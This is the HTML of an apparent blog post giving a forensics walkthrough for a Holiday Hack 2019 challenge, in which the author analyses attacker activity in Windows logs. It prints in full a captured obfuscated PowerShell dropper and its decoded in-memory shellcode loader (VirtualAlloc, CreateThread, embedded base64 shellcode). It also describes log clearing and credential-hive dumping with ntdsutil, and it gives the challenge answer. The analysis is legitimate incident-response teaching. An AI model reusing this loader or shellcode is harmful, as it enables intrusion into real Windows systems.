@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="What looks like the most helpful part of these logs are the process event types, so we can look at the command_line attribute of each object.  The first thing we see is a bunch of calls to evtutil whi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Determine Attacker Technique">
+<meta property="og:url" content="http://tcmal.xyz/determine-attacker-technique/index.html">
+<meta property="og:site_name" content="tcmal">
+<meta property="og:description" content="What looks like the most helpful part of these logs are the process event types, so we can look at the command_line attribute of each object.  The first thing we see is a bunch of calls to evtutil whi">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-01-19T00:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-13T21:27:33.567Z">
+<meta property="article:author" content="tcmal">
+<meta property="article:tag" content="Infosec">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Forensics">
+<meta property="article:tag" content="PowerShell">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Determine Attacker Technique</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/archives/">Recent</a></li>
+         
+          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/crate/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/determine-compromised-system/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://tcmal.xyz/determine-attacker-technique/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://tcmal.xyz/determine-attacker-technique/&text=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tcmal.xyz/determine-attacker-technique/&is_video=false&description=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Determine Attacker Technique&body=Check out this article: http://tcmal.xyz/determine-attacker-technique/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://tcmal.xyz/determine-attacker-technique/&name=Determine Attacker Technique&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://tcmal.xyz/determine-attacker-technique/&t=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Determine Attacker Technique
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">tcmal</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-01-19T00:00:00.000Z" itemprop="datePublished">2020-01-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Holiday-Hack-2019/">Holiday Hack 2019</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Forensics/" rel="tag">Forensics</a>, <a class="tag-link" href="/tags/Infosec/" rel="tag">Infosec</a>, <a class="tag-link" href="/tags/PowerShell/" rel="tag">PowerShell</a>, <a class="tag-link" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>What looks like the most helpful part of these logs are the <code>process</code> event types, so we can look at the <code>command_line</code> attribute of each object. </p>
+<p>The first thing we see is a bunch of calls to <code>evtutil</code> which seem to be clearing a bunch of different event types. This implies the attacker has already stopped the event service and so has admin privilleges.</p>
+<p>We then see <code>services.exe</code> start a service named <code>KnKvTkXn</code>. This makes a new process with the following <code>command_line</code>:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-noni</span> <span class="literal">-c</span> <span class="string">"if([IntPtr]::Size -eq 4)&#123;<span class="variable">$b</span>='powershell.exe'&#125;else&#123;<span class="variable">$b</span>=<span class="variable">$env:windir</span>+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'&#125;;<span class="variable">$s</span>=New-Object System.Diagnostics.ProcessStartInfo;<span class="variable">$s</span>.FileName=<span class="variable">$b</span>;<span class="variable">$s</span>.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';<span class="variable">$s</span>.UseShellExecute=<span class="variable">$false</span>;<span class="variable">$s</span>.RedirectStandardOutput=<span class="variable">$true</span>;<span class="variable">$s</span>.WindowStyle='Hidden';<span class="variable">$s</span>.CreateNoWindow=<span class="variable">$true</span>;<span class="variable">$p</span>=[System.Diagnostics.Process]::Start(<span class="variable">$s</span>);"</span></span><br></pre></td></tr></table></figure>
+
+<p>This is a dropper that’s just decoding and decompressing some code, it’s easier to understand if you cut out a lot of the powershell-ness:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StartProcess(..., Script(Gzip_UNCOMPRESS(FromBase64String(<span class="string">"BLAHBLAHBLAH"</span>))))</span><br></pre></td></tr></table></figure>
+
+<p>Since this is a powershell script we can put the base64 into <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(' target="_blank" rel="noopener"A-Za-z0-9%2B/%3D',true)Gunzip()&input=SDRzSUFLbmUwMTBDQTdWV2JXL2FTQkQrbkVqNUQxYUZoSzBRakFOdG1raVZiczJiSVRpQkdNeGIwV2xqcjgzQzJnWjdEWmhlLy91TkFhZXBtdDYxSjUyVmwvWHV6T3pNTTgvTTJJbDlpOVBBRjJKZGFRaGZMczdQdWpqRW5pRG1hT1ZEUWNqdHpZUno2ZXdNRG5LYjdXNzRLSHdTeENsYXJXcUJoNmsvdTd1cnhtRklmSDU4THpZSlIxRkV2R2RHU1NSS3dsL0NjRTVDY3ZYNHZDQVdGNzRJdVQrTFRSWThZM1lTUzZyWW1oUGhDdmwyZXRZSkxKejZVelJXakhJeC8vbHpYcHBlS2JOaWZSMWpGb2w1STRrNDhZbzJZM2xKK0NxbEYvYVRGUkh6T3JYQ0lBb2NYaHhTdjN4ZEhQZ1Jkc2dEV05zUW5mQjVZRWQ1Q2NLQW41RHdPUFNGWTBDcGhlTzVtSWRsTnd3c1pOc2hpYUo4UVppbXRxZXoyUi9pOUhUeFUreHo2cEZpeStja0RGWUdDVGZVSWxGUnc3N055Qk54WnFCbDhKRDY3a3lTUUd3VExJbVk4MlBHQ3NMdm1CRWZ5RGFEN1ZlVnhOZEtJTlhsb1ZTQVhMNFZxQjdZTVNOSDFmd2JucVlFa09CNUlRR0E5L1hpL09MY3lTampkMjVmTXdaV1o5UERtb0I3WWplSTZFSHNrMUFxQ0RyY2cza1FKdkNhNjRjeGtXWXY0QXE1WmQyZ2haL3JLNWt3aUhxbS9lY0E5cVptUU8wWjZKeHlta3MyNmU3UG1Wa2pEdlZKTGZHeFI2Mk1mT0piS0JPSGtVT0V4VXpzQVh3Uzg2Y0RZdGNJSXk3bUtXeHBzbjlRcTN1VXYraXFNV1UyQ1pFRm1ZckFLMGlpOUwwengweUkrWmF2RXc4Z09yNEQrM0lPVUo1azBpZWFKOW50NlRzSTVhc01SMUZCNk1aUWMxWkJNQWhteEM0SXlJL282UWpGUERnczg5L2MxV1BHcVlVam5wbWJTVWNVVDdkVkF6L2lZV3hCemlEeXZyRWlGc1VzQmFJZ2FOUW1hbUpRTjdzMS95WU1WY3dZbEFGWTJrQWFZQ2NOMytBcEUwSnc4SkIxcVdnUTN2SldqSGdnY3lqOUJzTXVGUHFKN0FmcVlKZlkrZS85eTVoOHBHMktRd2JBSys4Z3VRWUxlRUV3YWNpaGY2U1lIZ2owMzI1LzFUckFqMnBJVGxrUXM5S1lxZ2xQR1oyenJaU01KMGdPQUlRY2dtK0VnYWZpaUh5b0hEdUUrRTUrcEZVRXo3amxNOTFTbDFSQlc2cTBkUGdkMEhJcnFOM1k5KzJGSm9lMTNkeEJyYWlsYTkxYVQ5TXFtN1poVnJoUmIvSDdib3ZyOWRGaVlTRHRhVERta3hiUytyUzBIRmYycXpiZEd4MWtqM2Z5aDcyNjM1YlUzWDdoMnM2NDVqanVqV004S2U4YnRET3M5dFRTTmU3VTZuRm5xRzdWVWlXcTA2M1dvNFBlc3QzZ3oyT1Q0WUVqdXlQbEZ0TmRKMXlZU3FEdld3ZzE1MlZyMzNiTTVseTNrN0ZHeVVJdWRXZ1A5UkM2dDU0R2c2YTdjcHNSa20vTmRkVmJvSFVESTR4YXFHNG03ZmRNN1EwYUtoclUxUjUrRExybHk1cXNUT3gxdlRFWjRiYkg3S1ltSytNUnNsRW85OTI1Y3ZNNDkxT2NzS3V1MVZRR2RTWkpRd2FaYmdWcGxXdTZuNng3VFJmVlFjYjBBb1FiZERtNEhJSE5oejdvREFlS0hTRHV0MGF5YkxxeWl4eGpQc1pJQldsMWpScHFVRTArZHZXdWJKclhjK1Y1cWN6Qlp6TGFmTlRiNkxKaGRXVlp2dlNlNGErTUxIMjE4MGZxOW1iamFrWndqKyt4dVptVVphVy9iVHBvalM0dlZVVjk1bHE5M043QXZYMzVkdkRwWGNvZElFOHVxSG12YVBHemJxN2pNSnBqQm5TQkxwMVZaeU1JRzZlKzJ3MW9xaUdLaDVHOUpLRlBHTXc3bUlnWnpSRmpnWlUyL3JSRHc4dzVUb0owTUExZ1diNStjeVVKTDRMU3QzR1FiZDNkVGNCSktCdmJLbmFJNy9KNW9iUXJsMHJRMmt1N1Nna2kvUFd3cXNFcUVjRlFJUjBNS1NoSHMreGdWa3JyS01lMHllai9oZXBVdlhQNFovOExWTi8yL3VIMGwrQXJGUTdoL3JENy9jWnZnZm5iZ1E4eDVTQnBRUHRoNURqNTNvei94SXBYWHdacFVpRHJ6dWxKUCs0ZVkzNzFBQjhNRitkL0E2MGhidnhKQ2dBQQ">cyberchef</a> and have a look at what it’s doing:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uM1F</span></span> &#123;</span><br><span class="line">	<span class="keyword">Param</span> (<span class="variable">$i46</span>, <span class="variable">$zVytt</span>)		</span><br><span class="line">	<span class="variable">$vwxWO</span> = ([<span class="type">AppDomain</span>]::CurrentDomain.GetAssemblies() | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.GlobalAssemblyCache <span class="operator">-And</span> <span class="variable">$_</span>.Location.Split(<span class="string">'\\'</span>)[-<span class="number">1</span>].Equals(<span class="string">'System.dll'</span>) &#125;).GetType(<span class="string">'Microsoft.Win32.UnsafeNativeMethods'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$vwxWO</span>.GetMethod(<span class="string">'GetProcAddress'</span>, [<span class="type">Type</span>[]]<span class="selector-tag">@</span>([<span class="type">System.Runtime.InteropServices.HandleRef</span>], [<span class="built_in">String</span>])).Invoke(<span class="variable">$null</span>, <span class="selector-tag">@</span>([<span class="type">System.Runtime.InteropServices.HandleRef</span>](<span class="built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="built_in">New-Object</span> IntPtr), (<span class="variable">$vwxWO</span>.GetMethod(<span class="string">'GetModuleHandle'</span>)).Invoke(<span class="variable">$null</span>, <span class="selector-tag">@</span>(<span class="variable">$i46</span>)))), <span class="variable">$zVytt</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nL9</span></span> &#123;</span><br><span class="line">	<span class="keyword">Param</span> (</span><br><span class="line">		[<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">0</span>, <span class="type">Mandatory</span> = <span class="variable">$True</span>)] [<span class="type">Type</span>[]] <span class="variable">$kESi</span>,</span><br><span class="line">		[<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">1</span>)] [<span class="type">Type</span>] <span class="variable">$mVd_U</span> = [<span class="built_in">Void</span>]</span><br><span class="line">	)</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$yv</span> = [<span class="type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="built_in">New-Object</span> System.Reflection.AssemblyName(<span class="string">'ReflectedDelegate'</span>)), [<span class="type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="string">'InMemoryModule'</span>, <span class="variable">$false</span>).DefineType(<span class="string">'MyDelegateType'</span>, <span class="string">'Class, Public, Sealed, AnsiClass, AutoClass'</span>, [<span class="type">System.MulticastDelegate</span>])</span><br><span class="line">	<span class="variable">$yv</span>.DefineConstructor(<span class="string">'RTSpecialName, HideBySig, Public'</span>, [<span class="type">System.Reflection.CallingConventions</span>]::Standard, <span class="variable">$kESi</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)</span><br><span class="line">	<span class="variable">$yv</span>.DefineMethod(<span class="string">'Invoke'</span>, <span class="string">'Public, HideBySig, NewSlot, Virtual'</span>, <span class="variable">$mVd_U</span>, <span class="variable">$kESi</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$yv</span>.CreateType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$dc</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U="</span>)</span><br><span class="line">		</span><br><span class="line"><span class="variable">$oDm</span> = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>]) ([<span class="built_in">Int</span><span class="type">Ptr</span>]))).Invoke([<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero, <span class="variable">$dc</span>.Length,<span class="number">0</span>x3000, <span class="number">0</span>x40)</span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::Copy(<span class="variable">$dc</span>, <span class="number">0</span>, <span class="variable">$oDm</span>, <span class="variable">$dc</span>.length)</span><br><span class="line"></span><br><span class="line"><span class="variable">$lHZX</span> = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="built_in">Int</span><span class="type">Ptr</span>]) ([<span class="built_in">Int</span><span class="type">Ptr</span>]))).Invoke([<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero,<span class="number">0</span>,<span class="variable">$oDm</span>,[<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero,<span class="number">0</span>,[<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero)</span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="built_in">Int</span><span class="type">32</span>]))).Invoke(<span class="variable">$lHZX</span>,<span class="number">0</span>xffffffff) | <span class="built_in">Out-Null</span></span><br></pre></td></tr></table></figure>
+
+<p>The key things we see here are another base64 string, as well as calls to functions from <code>kernel32.dll</code>: <code>GetProcAddress</code>, <code>VirtualAlloc</code> &amp; <code>CreateThread</code>. This looks a lot like code for DLL injection.</p>
+<p>Though it’s heavily obfuscated, we can still try to search for where this code is from: Googling for <a href="https://www.google.com/search?ei=8sT3XZnYEoeO8gKkyLBQ&q=%5BSystem.Runtime.InteropServices.Marshal%5D%3A%3AGetDelegateForFunctionPointer&oq=%5BSystem.Runtime.InteropServices.Marshal%5D%3A%3AGetDelegateForFunctionPointer&gs_l=psy-ab.3..0j0i22i30.12331.13836..13931...2.0..0.192.1069.0j6......0....1j2..gws-wiz.....0..0i30.ZTKeiFd9N0c&ved=0ahUKEwiZmanH3rrmAhUHh1wKHSQkDAoQ4dUDCAs&uact=5" target="_blank" rel="noopener"><code>[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer</code></a> gives us <a href="https://isc.sans.edu/forums/diary/Fileless+Malicious+PowerShell+Sample/23081/" target="_blank" rel="noopener">a post on the SANS ISC forums</a> with a very similar script. But this still isn’t relevant to the actual challenge.</p>
+<p>After the DLL injection we see a ton of <code>net use</code> commands, which look like the attacker password spraying localhost. If we keep going however, we see a call to <code>ntdsutil.exe</code>.</p>
+<p>This is a tool that’s meant to be used for creating backups of SYSTEM &amp; SAM hives, which together can be decoded to get raw password hashes. It’s got a lot of legitimate uses, but in this case we see it being used to create a full backup of everything which the attacker will likely go on to try cracking offline.</p>
+<p>The answer to the question is <code>ntdsutil</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/archives/">Recent</a></li>
+         
+          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://tcmal.xyz/determine-attacker-technique/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://tcmal.xyz/determine-attacker-technique/&text=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tcmal.xyz/determine-attacker-technique/&is_video=false&description=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Determine Attacker Technique&body=Check out this article: http://tcmal.xyz/determine-attacker-technique/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://tcmal.xyz/determine-attacker-technique/&title=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://tcmal.xyz/determine-attacker-technique/&name=Determine Attacker Technique&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://tcmal.xyz/determine-attacker-technique/&t=Determine Attacker Technique" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
